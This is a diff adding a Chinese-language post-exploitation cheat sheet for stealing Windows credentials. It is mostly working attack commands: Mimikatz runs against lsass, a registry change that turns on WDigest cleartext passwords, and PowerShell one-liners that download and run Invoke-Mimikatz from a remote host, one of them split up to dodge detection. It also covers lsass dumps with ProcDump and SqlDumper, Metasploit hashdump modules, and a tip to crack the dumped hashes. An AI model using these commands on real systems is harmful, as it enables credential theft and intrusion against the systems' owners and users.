@@ -1,0 +1,48 @@
+Mimikatz:
+	mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full"                //从 lsass中抓取密码
+	在win2012及以上不能抓取明文，修改注册表允许内存明文加载密码并重启后有可能抓取到明文密码
+		reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1 
+	
+	
+POWERSHELL
+
+	Invoke-Mimikatz.ps1
+	Get-PassHashes.ps1                                                   //本地或远程加载
+		
+		
+		1、powershell IEX (New-Object Net.WebClient).DownloadString('ps1脚本路径');Get-PassHashes
+		2、powershell "IEX (New-Object Net.WebClient).DownloadString('https://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"   
+		3、powershell "$a='IEX((New-Object Net.WebClient).DownloadString(''ht';$b='tp://x.x.x.x/ps/Invoke-Mimikatz.ps1'')); Invoke-Mimikatz';IEX ($a+$b)"   
+		//简单分割混淆，或用replace简单混淆
+		
+		
+
+Procdump
+	将lsass转成dmp文件，下载到本地利用mimikatz读取
+	
+		procdump.exe -accepteula -ma lsass.exe lsass.dmp   #32位
+		procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp #64位系统
+		mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit        //在相同版本的操作系统使用mimikatz读取密码hash。
+		
+SqlDumper.exe
+	将lsass转成dmp文件，下载到本地利用mimikatz读取
+		tasklist /svc | findstr lsass.exe                                                   //查看lsass.exe 的PID号
+		Sqldumper.exe ProcessID    XXXXX                                    //导出mdmp文件
+	        mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" exit       //在相同版本的操作系统使用mimikatz读取密码hash。
+
+MSF        
+	加载mimikatz模块
+		msv　　　　 获取hash
+		kerberos 　　获取明文
+	调用模块脚本
+		run windows/gather/smart_hashdump
+		run windows/gather/hashdump
+	
+CS
+	加载mimikatz
+	转存hash
+
+
+
+
+抓取hash可以尝试爆破获得明文密码
